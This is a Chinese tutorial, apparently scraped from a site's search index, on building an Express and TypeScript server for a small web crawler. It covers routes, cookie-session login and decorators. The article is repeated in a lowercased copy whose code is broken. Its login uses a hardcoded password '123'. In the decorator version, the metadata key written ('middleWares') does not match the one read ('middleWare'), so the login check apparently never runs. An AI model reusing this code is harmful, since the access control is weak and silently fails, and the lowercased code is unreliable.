     } catch (error) {\n            res.json(getResponse(false, '爬取出错！'));\n        }\n    }\n});\n\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\n\n# 使用装饰器来优化\n\n我们发现router.ts里面有很多get方法，并且不是使用Class形式编写的代码。如果要使用Class形式来编写，可以考虑使用一个类来编写各种路由handler，用另一个类来操作前一个类的原型和Router。\n\n其实可以使用装饰器配合元数据，思路：写一个Class，首先成员方法是handler事件处理函数，给这个成员方法写个方法装饰器用来存储路由路径和本方法；然后对Class写个类装饰器，遍历这个类的原型上的属性，如果该属性属于元数据中的一员，证明它就是handler事件处理函数，然后将事件处理函数加入到Router中。这样就完成了路由的添加，并且这个Class无需实例化，只需要导入到index.ts即可，也就是触发装饰器。\n\n对接口的返回做了优化，data不使用Object，而是使用泛型，泛型传入来规定data是个什么类型。\n\n还对代码结构层次做了优化，将各种装饰器全都分离出来并且放到一个文件夹里，另外将登陆相关逻辑和爬取操作也分离开并且放在一个文件夹里。\n\nsrc\n  ├──controller                 （控制层）\n  │   ├──CrawlController.ts     （爬取操作业务逻辑）\n  │   └──LoginController.ts     （登陆处理业务逻辑）\n  ├──crawler                    （爬虫过程）\n  │   ├──bookAnalyzer.ts        （分析器）\n  │   └──crawler.ts             （爬虫读取写入）\n  ├──decorator                  （装饰器）\n  │   ├──controllerDecorator.ts （业务类的装饰器）\n  │   ├──requestDecorator.ts    （router的handler的装饰器）\n  │   └──useDecorator.ts        （router的中间件的装饰器）\n  ├──utils                      （工具）\n  │   └──getResponse.ts         （响应报文组装）\n  ├──index.ts                   （入口文件，也是编译入口）\n  └──router.ts                  （router）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 优化后的代码清单\n\ngetResponse.ts\n\ninterface Iresult<T> {\n    success: boolean;\n    errMsg?: string;\n    data: T;\n};\n// 返回报文\nexport const getResponse = <T>(data: T, errMsg?: string): Iresult<T> => {\n    return { success: errMsg == null, errMsg, data }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nCrawlController.ts\n\nimport fs from 'fs';\nimport path from 'path';\nimport { Response } from 'express';\nimport { controller } from \"../decorator/controllerDecorator\";\nimport { get } from \"../decorator/requestDecorator\";\nimport { use } from \"../decorator/useDecorator\";\nimport Crawler from '../crawler/crawler';\nimport BookAnalyzer, { IrankInfo } from '../crawler/bookAnalyzer';\nimport { ExpRequest, checkLogin } from './LoginController';\nimport { getResponse } from '../utils/getResponse';\n\n// 这个类不用实例化也不用静态调用，但是一定要在index.ts里导入，因为要触发装饰器\n@controller('/')\nclass CrawlController {\n    // 展示爬取数据\n    @get('/show')\n    @use(checkLogin)\n    private show(req: ExpRequest, res: Response): void {\n        try {\n            const filePath = path.resolve(__dirname, '../../data/book.json');\n            const jsonStr = fs.readFileSync(filePath, 'utf-8');\n            res.json(getResponse<IrankInfo>(JSON.parse(jsonStr)));\n        } catch (error) {\n            res.json(getResponse<boolean>(false, '展示数据出错！'));\n        }\n    }\n    // 去爬取一次数据\n    @get('/data')\n    @use(checkLogin)\n    private data(req: ExpRequest, res: Response): void {\n        try {\n            const url = 'http://top.hengyan.com/haokan/';\n            const crawler: Crawler = new Crawler(url, BookAnalyzer.I);\n            res.json(getResponse<boolean>(true));\n        } catch (error) {\n            res.json(getResponse<boolean>(false, '爬取出错！'));\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\nLoginController.ts\n\nimport { Request, Response, NextFunction, RequestHandler } from 'express';\nimport 'reflect-metadata';\nimport { controller } from \"../decorator/controllerDecorator\";\nimport { get, post } from \"../decorator/requestDecorator\";\nimport { use } from \"../decorator/useDecorator\";\nimport { getResponse } from '../utils/getResponse';\n\n// 请求体的session\ninterface ISession extends CookieSessionInterfaces.CookieSessionObject {\n    login: boolean;\n}\n// 请求体\nexport interface ExpRequest extends Request {\n    body: {\n        [key: string]: string | undefined;\n    },\n    session: ISession\n};\n// 登陆状态\nconst isLogin = (req: ExpRequest, res: Response): boolean => {\n    return !!(req.session && req.session.login);\n};\n// 登陆状态的中间件\nexport const checkLogin: RequestHandler = (req: ExpRequest, res: Response, next: NextFunction): void => {\n    if (isLogin(req, res)) {\n        next();\n    } else {\n        res.json(getResponse<boolean>(false, '您还没有登陆！请先登陆！'));\n    }\n};\n// 根路径\nconst root: string = '/';\n\n// 这个类不用实例化也不用静态调用，但是一定要在index.ts里导入，因为要触发装饰器\n@controller(root)\nclass LoginController {\n    // 主页\n    @get('/')\n    private home(req: ExpRequest, res: Response): void {\n        if (isLogin(req, res)) {\n            res.send(\n                `<html>\n                    <body>\n                        <a href=\"/show\">查看数据</a>\n                        <a href=\"/data\">爬取数据</a>\n                        <a href=\"/logout\">退出登陆</a>\n                    </body>\n                </html>`);\n        } else {\n            // 没有登陆显示登陆框\n            res.send(`\n                <html>\n                    <body>\n                        <form method=\"post\" action=\"/login\">\n                            <input type=\"password\" name=\"password\" />\n                            <button>登陆</button>\n                        </form>\n                    </body>\n                </html>\n            `);\n        }\n    }\n    // 登陆校验\n    @post('/login')\n    private loginPost(req: ExpRequest, res: Response): void {\n        const rootPath = (!root || root === '/') ? '' : root;\n        if (isLogin(req, res)) {\n            // 之前登陆过了，重定向到主页\n            res.redirect(`${rootPath}/`);\n        } else {\n            const { password } = req.body;\n            if (password === '123') {\n                // 登陆状态更新\n                req.session.login = true;\n                // 重定向到主页\n                res.redirect(`${rootPath}/`);\n            } else {\n                res.json(getResponse<boolean>(false, '密码错误！'));\n            }\n        }\n    }\n    // 登出\n    @get('/logout')\n    private logout(req: ExpRequest, res: Response): void {\n        if (isLogin(req, res)) {\n            req.session.login = undefined;\n            res.json(getResponse<boolean>(true));\n        } else {\n            res.json(getResponse<boolean>(false, '您本来就是未登录状态！'));\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n\n\ncontrollerDecorator.ts\n\nimport { RequestHandler } from 'express';\nimport router from '../router';\nimport { PathType } from './requestDecorator';\n\n// 类的装饰器，这里包了一层工厂函数，目的是controller自带接口路径\nexport function controller(root: string) {\n    // 真正的装饰器\n    return function (target: new (...args: any[]) => {}) {\n        // 遍历原型上的属性\n        for (let key in target.prototype) {\n            // 路由路径\n            const path: string = Reflect.getMetadata('path', target.prototype, key);\n            // 是router.get还是router.post\n            const method: PathType = Reflect.getMetadata('method', target.prototype, key);\n            // 中间件\n            const middleWare: RequestHandler = Reflect.getMetadata('middleWare', target.prototype, key);\n            // 方法\n            const handler = target.prototype[key];\n            // 都存在才添加路由\n            if (path && method && handler) {\n                const fullPath = (!root || root === '/') ? path : `${root}${path}`\n                if (middleWare) { // 使用中间件\n                    router[method](fullPath, middleWare, handler);\n                } else {\n                    router[method](fullPath, handler);\n                }\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nrequestDecorator.ts\n\n// 枚举，是router.get还是router.post\nexport enum PathType {\n    Get = 'get',\n    Post = 'post'\n}\n// methodType来区分是router.get还是router.post，这是包第一层工厂函数的原因\nfunction getRequestDecorator(methodType: PathType) {\n    // value是外部调用get(value)的入参，这也是再包一层工厂函数的原因\n    return function (value: string) {\n        // 类的方法的装饰器：target是方法所在的原型对象，key是方法名。最后的这个才是真正的装饰器。\n        return function (target: any, key: string) {\n            // 将handler和对应方法存入元素数据\n            // 'path'是metadataKey，value是metadataValue，target是方法所在的原型对象，key是方法名\n            Reflect.defineMetadata('path', value, target, key);\n            // 存入元数据，你是router.get还是router.post\n            Reflect.defineMetadata('method', methodType, target, key);\n        }\n    }\n}\n// get的装饰器，用于使用router.get()\nexport const get = getRequestDecorator(PathType.Get);\n// post的装饰器，用于使用router.post()\nexport const post = getRequestDecorator(PathType.Post);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nuseDecorator.ts\n\nimport { RequestHandler } from 'express';\n// use装饰器，用于使用中间件。这里包了一层工厂函数，因为要传middleWare进来\nexport function use(middleWare: RequestHandler) {\n    // 真正的装饰器\n    return function (target: any, key: string) {\n        const originMiddleWare: RequestHandler[] = Reflect.getMetadata('middleWares', target, key) || [];\n        // 可以使用多个中间件\n        originMiddleWare.push(middleWare);\n        Reflect.defineMetadata('middleWares', originMiddleWare, target, key);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n",normalizedContent:"# 用express支撑小爬虫\n\n\n# 安装使用express\n\nexpress是一个基于node的web后端框架，特点是极简灵活，提供精简的基本web应用程序功能。也是第一代node后端框架，也是目前使用率第一的框架，有很多框架还有程序是基于它的。\n\n局部安装express和它的类型声明文件：npm install express --save，npm install @types/express --save\n\n编写index.ts，代码如下，使用ts-node运行它，在\"http://localhost:7001/\"里就能看到打印的“hello”\n\nimport express from 'express';\n// 创建一个新的应用程序\nconst app = express();\n// 定义路由，发送内容\napp.get('/', (req, res) => {\n    res.send('hello');\n});\n// 绑定并监听连接\napp.listen(7001, () => {\n    console.log('start serve');\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 定义路由项\n\n像上面这个简单例子里使用了app.get定义了一个路由，如果使用多个呢？可以使用express中的router来定义，并且可以单独抽到一个ts文件里书写。\n\nrouter.ts\n\nimport { router, request, response } from 'express';\n\nconst router = router();\nrouter.get('/', (req: request, res: response) => {\n    res.send('hello');\n});\nrouter.get('/data', (req: request, res: response) => {\n    res.send('hello data');\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nindex.ts\n\nimport express from 'express';\nimport router from './router'\n\n// 创建一个新的应用程序\nconst app = express();\n// 使用之前定义的路由\napp.use(router);\n// 绑定并监听连接\napp.listen(7001, () => {\n    console.log('start serve');\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 拿取爬虫数据\n\n将之前写的爬虫相关的类crawler、bookanalyzer导进来，在/data路由下再去爬取新数据。但是要给访问/data路由进行限制，拥有权限的才允许访问。可以使用post请求传递密码，然后对路由的request的body进行校验。\n\n但是校验过程中，request的body解析会有问题，我们需要借助一个中间件，npm install body-parser --save，安装完后在index.ts导入它，并在使用路由前加上这一行代码app.use(bodyparser.urlencoded({ extended: false }))。接着完善我们的router.ts：\n\nimport { router, request, response } from 'express';\nimport crawler from './crawler';\nimport bookanalyzer from './bookanalyzer';\n\nconst router = router();\n\nrouter.get('/', (req: request, res: response) => {\n    res.send(`<html>\n                <body><form method=\"post\" action=\"/data\">\n                    <input type=\"password\" name=\"password\" />\n                    <button>提交</button>\n                </form></body>\n            </html>`);\n});\n// 对应前端的post请求\nrouter.post('/data', (req: request, res: response) => {\n    if (req.body.password === '123') {\n        const url = 'http://top.hengyan.com/haokan/';\n        const crawler: crawler = new crawler(url, bookanalyzer.i);\n        res.send('爬取数据成功!');\n    } else {\n        res.send('密码错误！');\n    }\n});\n\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 扩展express的类型定义\n\n虽然express有类型定义文件，但会有些瑕疵，比如request和response的body在express里是any，这不太符合规范。解决方案就是使用interface约束一个新类型，并且这个新类型去继承老类型，然后在使用时就使用这个新类型。\n\ninterface inewrequest extends request {\n    body: {\n        [key: string]: string | undefined;\n    };\n};\n\n\n1\n2\n3\n4\n5\n\n\n还有就是使用中间件的话，特别是使用自定义中间件，难免会遇到在request新添加属性。可以将express原有的类型定义和自己写的类型定义融合，这里要明确一点：是融合不是覆盖以前的。像上面使用inteface配合extends是使用新类型名，类型定义融合虽然使用老的类型名，但也只是扩充了老类型的属性而已。\n\ndeclare namespace express { // 这里要跟原来的*.d.ts里的一样\n    interface request { // 这里要跟原来的*.d.ts里的一样\n        xxx: string; // 而这里就是新添的属性，后面就会类型定义融合\n    }\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 状态持久化\n\n\n# 使用cookie-session中间件\n\n登陆的状态需要持久化，可以使用中间件npm install cookie-session --save，它有自己的类型定义npm install @types/cookie-session -d。\n\n加上使用中间件的代码：\n\nimport express from 'express';\nimport cookiesession from 'cookie-session';\nimport bodyparser from 'body-parser'\nimport router from './router'\n\n// 创建一个新的应用程序\nconst app = express();\n\n// 使用cookie-session中间件\napp.use(cookiesession({\n    name: 'session',\n    keys: ['login'],\n    // cookie options\n    maxage: 24 * 60 * 60 * 1000 // 24 hours\n}))\n//使用中间件来解析form表单请求里的body\napp.use(bodyparser.urlencoded({ extended: false }));\n// 使用路由\napp.use(router);\n\n// 绑定并监听连接\napp.listen(7001, () => {\n    console.log('start serve');\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 登陆登出\n\n最主要的就在于登陆状态的判断，req.session上一小节里的中间件，登陆成功后给session里塞一个login属性，在下次访问对应路由时会校验它。\n\n我们还添加了一个中间页面，里面有“查看数据”、“爬取数据”、“退出登陆”这三个功能性按钮，对应也给他们设置了路由。\n\nimport { router, request, response } from 'express';\nimport crawler from './crawler/crawler';\nimport bookanalyzer from './crawler/bookanalyzer';\nimport fs from 'fs';\nimport path from 'path';\n\ninterface exprequest extends request {\n    body: {\n        [key: string]: string | undefined;\n    }\n}\n\nconst router = router();\n\n// 登陆状态\nconst checklogin = (req: exprequest, res: response) => {\n    if (!req.session || !req.session.login) {\n        res.send(\n            `<html>\n                <body>\n                    您还没有登陆！请先<a href=\"/\">登陆！</a>\n                </body>\n            </html>`);\n        return false;\n    }\n    return true;\n}\n// 主页\nrouter.get('/', (req: exprequest, res: response) => {\n    if (req.session && req.session.login) {\n        // 登陆过了\n        res.send(\n            `<html>\n                <body>\n                    <a href=\"/show\">查看数据</a>\n                    <a href=\"/data\">爬取数据</a>\n                    <a href=\"/logout\">退出登陆</a>\n                </body>\n            </html>`);\n    } else {\n        // 没有登陆显示登陆框\n        res.send(`\n            <html>\n                <body>\n                    <form method=\"post\" action=\"/login\">\n                        <input type=\"password\" name=\"password\" />\n                        <button>登陆</button>\n                    </form>\n                </body>\n            </html>\n        `);\n    }\n});\n// 登陆校验\nrouter.post('/login', (req: exprequest, res: response) => {\n    if (req.session && req.session.login) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    } else {\n        const { password } = req.body;\n        if (password === '123') {\n            // 登陆状态更新\n            req.session.login = true;\n            // 重定向到中转站\n            res.redirect('/');\n        } else {\n            res.send(\n                `<html>\n                    <body>\n                        密码错误！请重新<a href=\"/\">登陆！</a><br/>\n                    </body>\n                </html>`);\n        }\n    }\n});\n// 以get的方式访问登陆校验\nrouter.get('/login', (req: exprequest, res: response) => {\n    if (checklogin(req, res)) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    }\n});\n// 登出操作\nrouter.get('/logout', (req: exprequest, res: response) => {\n    if (req.session && req.session.login) {\n        req.session.login = undefined;\n        res.send(\n            `<html>\n                <body>\n                    登出成功！需要再<a href=\"/\">登陆</a>吗？\n                </body>\n            </html>`);\n    } else {\n        res.send(\n            `<html>\n                <body>\n                    您本来就是未登录状态！请问需要<a href=\"/\">登陆</a>吗？\n                </body>\n            </html>`);\n    }\n});\n// 展示爬虫数据\nrouter.get('/show', (req: exprequest, res: response) => {\n    if (checklogin(req, res)) {\n        try {\n            const filepath = path.resolve(__dirname, '../data/book.json');\n            const jsonstr = fs.readfilesync(filepath, 'utf-8');\n            res.send(json.parse(jsonstr));\n        } catch (error) {\n            res.send(\n                `<html>\n                    <body>\n                        展示数据出错！<a href=\"/\">返回</a><br/>\n                        ${error}\n                    </body>\n                </html>`);\n        }\n    }\n});\n// 爬一次数据\nrouter.get('/data', (req: exprequest, res: response) => {\n    if (checklogin(req, res)) {\n        try {\n            const url = 'http://top.hengyan.com/haokan/';\n            const crawler: crawler = new crawler(url, bookanalyzer.i);\n            res.send(\n                `<html>\n                    <body>\n                        爬取成功！<br/>\n                        <a href=\"/show\">查看全部数据</a>\n                    </body>\n                </html>`);\n        } catch (error) {\n            res.send(\n                `爬取出错！`);\n        }\n    }\n});\n\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n\n\n\n# 接口化\n\n减少res.send给前端发送html元素，将其换成res.jsonn，也就是以接口的形式返回给前端，前端根据接口再去写html。\n\ngetresponse.ts\n\ninterface iresult {\n    success: boolean;\n    errmsg?: string;\n    data: object;\n};\nexport const getresponse = (data: object, errmsg?: string): iresult => {\n    return { success: errmsg == null, errmsg, data }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nrouter.ts\n\nimport { router, request, response } from 'express';\nimport crawler from './crawler/crawler';\nimport bookanalyzer from './crawler/bookanalyzer';\nimport fs from 'fs';\nimport path from 'path';\nimport { getresponse } from './utils/getresponse';\n\ninterface exprequest extends request {\n    body: {\n        [key: string]: string | undefined;\n    }\n}\n\nconst router = router();\n\n// 登陆状态\nconst checklogin = (req: exprequest, res: response) => {\n    if (!req.session || !req.session.login) {\n        res.json(getresponse(false, '您还没有登陆！请先登陆！'));\n        return false;\n    }\n    return true;\n}\n// 主页\nrouter.get('/', (req: exprequest, res: response) => {\n    if (req.session && req.session.login) {\n        // 登陆过了\n        res.send(\n            `<html>\n                <body>\n                    <a href=\"/show\">查看数据</a>\n                    <a href=\"/data\">爬取数据</a>\n                    <a href=\"/logout\">退出登陆</a>\n                </body>\n            </html>`);\n    } else {\n        // 没有登陆显示登陆框\n        res.send(`\n            <html>\n                <body>\n                    <form method=\"post\" action=\"/login\">\n                        <input type=\"password\" name=\"password\" />\n                        <button>登陆</button>\n                    </form>\n                </body>\n            </html>\n        `);\n    }\n});\n// 登陆校验\nrouter.post('/login', (req: exprequest, res: response) => {\n    if (req.session && req.session.login) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    } else {\n        const { password } = req.body;\n        if (password === '123') {\n            // 登陆状态更新\n            req.session.login = true;\n            // 重定向到中转站\n            res.redirect('/');\n        } else {\n            res.json(getresponse(false, '密码错误！'));\n        }\n    }\n});\n// 以get的方式访问登陆校验\nrouter.get('/login', (req: exprequest, res: response) => {\n    if (checklogin(req, res)) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    }\n});\n// 登出操作\nrouter.get('/logout', (req: exprequest, res: response) => {\n    if (req.session && req.session.login) {\n        req.session.login = undefined;\n        res.json(getresponse(true));\n    } else {\n        res.json(getresponse(false, '您本来就是未登录状态！'));\n    }\n});\n// 展示爬虫数据\nrouter.get('/show', (req: exprequest, res: response) => {\n    if (checklogin(req, res)) {\n        try {\n            const filepath = path.resolve(__dirname, '../data/book.json');\n            const jsonstr = fs.readfilesync(filepath, 'utf-8');\n            res.json(getresponse(json.parse(jsonstr)));\n        } catch (error) {\n            res.json(getresponse(error, '展示数据出错！'));\n        }\n    }\n});\n// 爬一次数据\nrouter.get('/data', (req: exprequest, res: response) => {\n    if (checklogin(req, res)) {\n        try {\n            const url = 'http://top.hengyan.com/haokan/';\n            const crawler: crawler = new crawler(url, bookanalyzer.i);\n            res.json(getresponse(true));\n        } catch (error) {\n            res.json(getresponse(false, '爬取出错！'));\n        }\n    }\n});\n\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\n\n# 使用装饰器来优化\n\n我们发现router.ts里面有很多get方法，并且不是使用class形式编写的代码。如果要使用class形式来编写，可以考虑使用一个类来编写各种路由handler，用另一个类来操作前一个类的原型和router。\n\n其实可以使用装饰器配合元数据，思路：写一个class，首先成员方法是handler事件处理函数，给这个成员方法写个方法装饰器用来存储路由路径和本方法；然后对class写个类装饰器，遍历这个类的原型上的属性，如果该属性属于元数据中的一员，证明它就是handler事件处理函数，然后将事件处理函数加入到router中。这样就完成了路由的添加，并且这个class无需实例化，只需要导入到index.ts即可，也就是触发装饰器。\n\n对接口的返回做了优化，data不使用object，而是使用泛型，泛型传入来规定data是个什么类型。\n\n还对代码结构层次做了优化，将各种装饰器全都分离出来并且放到一个文件夹里，另外将登陆相关逻辑和爬取操作也分离开并且放在一个文件夹里。\n\nsrc\n  ├──controller                 （控制层）\n  │   ├──crawlcontroller.ts     （爬取操作业务逻辑）\n  │   └──logincontroller.ts     （登陆处理业务逻辑）\n  ├──crawler                    （爬虫过程）\n  │   ├──bookanalyzer.ts        （分析器）\n  │   └──crawler.ts             （爬虫读取写入）\n  ├──decorator                  （装饰器）\n  │   ├──controllerdecorator.ts （业务类的装饰器）\n  │   ├──requestdecorator.ts    （router的handler的装饰器）\n  │   └──usedecorator.ts        （router的中间件的装饰器）\n  ├──utils                      （工具）\n  │   └──getresponse.ts         （响应报文组装）\n  ├──index.ts                   （入口文件，也是编译入口）\n  └──router.ts                  （router）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 优化后的代码清单\n\ngetresponse.ts\n\ninterface iresult<t> {\n    success: boolean;\n    errmsg?: string;\n    data: t;\n};\n// 返回报文\nexport const getresponse = <t>(data: t, errmsg?: string): iresult<t> => {\n    return { success: errmsg == null, errmsg, data }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\ncrawlcontroller.ts\n\nimport fs from 'fs';\nimport path from 'path';\nimport { response } from 'express';\nimport { controller } from \"../decorator/controllerdecorator\";\nimport { get } from \"../decorator/requestdecorator\";\nimport { use } from \"../decorator/usedecorator\";\nimport crawler from '../crawler/crawler';\nimport bookanalyzer, { irankinfo } from '../crawler/bookanalyzer';\nimport { exprequest, checklogin } from './logincontroller';\nimport { getresponse } from '../utils/getresponse';\n\n// 这个类不用实例化也不用静态调用，但是一定要在index.ts里导入，因为要触发装饰器\n@controller('/')\nclass crawlcontroller {\n    // 展示爬取数据\n    @get('/show')\n    @use(checklogin)\n    private show(req: exprequest, res: response): void {\n        try {\n            const filepath = path.resolve(__dirname, '../../data/book.json');\n            const jsonstr = fs.readfilesync(filepath, 'utf-8');\n            res.json(getresponse<irankinfo>(json.parse(jsonstr)));\n        } catch (error) {\n            res.json(getresponse<boolean>(false, '展示数据出错！'));\n        }\n    }\n    // 去爬取一次数据\n    @get('/data')\n    @use(checklogin)\n    private data(req: exprequest, res: response): void {\n        try {\n            const url = 'http://top.hengyan.com/haokan/';\n            const crawler: crawler = new crawler(url, bookanalyzer.i);\n            res.json(getresponse<boolean>(true));\n        } catch (error) {\n            res.json(getresponse<boolean>(false, '爬取出错！'));\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\nlogincontroller.ts\n\nimport { request, response, nextfunction, requesthandler } from 'express';\nimport 'reflect-metadata';\nimport { controller } from \"../decorator/controllerdecorator\";\nimport { get, post } from \"../decorator/requestdecorator\";\nimport { use } from \"../decorator/usedecorator\";\nimport { getresponse } from '../utils/getresponse';\n\n// 请求体的session\ninterface isession extends cookiesessioninterfaces.cookiesessionobject {\n    login: boolean;\n}\n// 请求体\nexport interface exprequest extends request {\n    body: {\n        [key: string]: string | undefined;\n    },\n    session: isession\n};\n// 登陆状态\nconst islogin = (req: exprequest, res: response): boolean => {\n    return !!(req.session && req.session.login);\n};\n// 登陆状态的中间件\nexport const checklogin: requesthandler = (req: exprequest, res: response, next: nextfunction): void => {\n    if (islogin(req, res)) {\n        next();\n    } else {\n        res.json(getresponse<boolean>(false, '您还没有登陆！请先登陆！'));\n    }\n};\n// 根路径\nconst root: string = '/';\n\n// 这个类不用实例化也不用静态调用，但是一定要在index.ts里导入，因为要触发装饰器\n@controller(root)\nclass logincontroller {\n    // 主页\n    @get('/')\n    private home(req: exprequest, res: response): void {\n        if (islogin(req, res)) {\n            res.send(\n                `<html>\n                    <body>\n                        <a href=\"/show\">查看数据</a>\n                        <a href=\"/data\">爬取数据</a>\n                        <a href=\"/logout\">退出登陆</a>\n                    </body>\n                </html>`);\n        } else {\n            // 没有登陆显示登陆框\n            res.send(`\n                <html>\n                    <body>\n                        <form method=\"post\" action=\"/login\">\n                            <input type=\"password\" name=\"password\" />\n                            <button>登陆</button>\n                        </form>\n                    </body>\n                </html>\n            `);\n        }\n    }\n    // 登陆校验\n    @post('/login')\n    private loginpost(req: exprequest, res: response): void {\n        const rootpath = (!root || root === '/') ? '' : root;\n        if (islogin(req, res)) {\n            // 之前登陆过了，重定向到主页\n            res.redirect(`${rootpath}/`);\n        } else {\n            const { password } = req.body;\n            if (password === '123') {\n                // 登陆状态更新\n                req.session.login = true;\n                // 重定向到主页\n                res.redirect(`${rootpath}/`);\n            } else {\n                res.json(getresponse<boolean>(false, '密码错误！'));\n            }\n        }\n    }\n    // 登出\n    @get('/logout')\n    private logout(req: exprequest, res: response): void {\n        if (islogin(req, res)) {\n            req.session.login = undefined;\n            res.json(getresponse<boolean>(true));\n        } else {\n            res.json(getresponse<boolean>(false, '您本来就是未登录状态！'));\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n\n\ncontrollerdecorator.ts\n\nimport { requesthandler } from 'express';\nimport router from '../router';\nimport { pathtype } from './requestdecorator';\n\n// 类的装饰器，这里包了一层工厂函数，目的是controller自带接口路径\nexport function controller(root: string) {\n    // 真正的装饰器\n    return function (target: new (...args: any[]) => {}) {\n        // 遍历原型上的属性\n        for (let key in target.prototype) {\n            // 路由路径\n            const path: string = reflect.getmetadata('path', target.prototype, key);\n            // 是router.get还是router.post\n            const method: pathtype = reflect.getmetadata('method', target.prototype, key);\n            // 中间件\n            const middleware: requesthandler = reflect.getmetadata('middleware', target.prototype, key);\n            // 方法\n            const handler = target.prototype[key];\n            // 都存在才添加路由\n            if (path && method && handler) {\n                const fullpath = (!root || root === '/') ? path : `${root}${path}`\n                if (middleware) { // 使用中间件\n                    router[method](fullpath, middleware, handler);\n                } else {\n                    router[method](fullpath, handler);\n                }\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nrequestdecorator.ts\n\n// 